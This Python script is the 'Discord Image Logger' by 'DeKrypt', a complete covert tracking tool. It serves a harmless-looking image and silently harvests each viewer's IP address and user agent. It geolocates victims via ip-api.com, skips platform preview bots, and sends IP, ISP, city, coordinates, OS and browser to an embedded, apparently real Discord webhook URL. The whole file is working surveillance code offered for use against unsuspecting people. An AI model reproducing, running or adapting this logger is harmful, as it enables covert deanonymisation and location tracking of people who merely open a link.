# Discord Image Logger
# By DeKrypt | Mirror Fix

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests, httpagentparser

_app_ = "Discord Image Logger"
__description__ = "A simple application to log IPs via Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://notepad-plus-plus.org/assets/images/notepad4ever.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {"doMessage": True, "message": "This browser has been pwned by DeKrypt's Image Logger", "richMessage": True},
    "vpnCheck": True,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": True,
    "redirect": {"redirect": False, "page": "https://your-link.here"}
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"An error occurred!\n```\n{error}\n```"}]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", image_url=None):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
                "color": config["color"],
                "url": f"{endpoint}",
                "image": {"url": image_url or config["image"]}
            }]
        })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,as,mobile,proxy,hosting").json()
    if info.get("status") != "success":
        reportError(f"Failed to get IP info for {ip}: {info.get('message', 'Unknown error')}")
        return

    if info.get("proxy") and config["vpnCheck"]:
        ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger IP Logged",
            "description": f"**A User Opened the Original Image!**\n\n"
                           f"**Endpoint:** {endpoint}\n\n"
                           f"**IP Info:**\n"
                           f"> IP: `{ip}`\n"
                           f"> Provider: {info.get('isp','Unknown')}\n"
                           f"> ASN: {info.get('as','Unknown')}\n"
                           f"> Country: {info.get('country','Unknown')}\n"
                           f"> Region: {info.get('regionName','Unknown')}\n"
                           f"> City: {info.get('city','Unknown')}\n"
                           f"> Coords: {info.get('lat','Unknown')}, {info.get('lon','Unknown')}\n"
                           f"> Timezone: {info.get('timezone','Unknown')}\n"
                           f"> Mobile: {info.get('mobile','Unknown')}\n"
                           f"> VPN: {info.get('proxy','False')}\n"
                           f"> Hosting/Server: {info.get('hosting','False')}\n\n"
                           f"**PC Info:**\n> OS: {os_name}\n> Browser: {browser}\n\n"
                           f"**User Agent:**\n{useragent or 'Unknown'}",
            "color": config["color"],
            "image": {"url": image_url or config["image"]}
        }]
    }

    requests.post(config["webhook"], json=embed)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            query = parse.urlparse(self.path).query
            params = parse.parse_qs(query)
            img_url = params.get("url", [config["image"]])[0]

            user_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')

            makeReport(user_ip, user_agent, endpoint=self.path, image_url=img_url)

            if config["redirect"]["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<img src="{img_url}" alt="Image">'.encode())

        except Exception as e:
            reportError(e)
            self.send_response(500)
            self.end_headers()

def run_server():
    port = 8080
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"{_app_} running on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
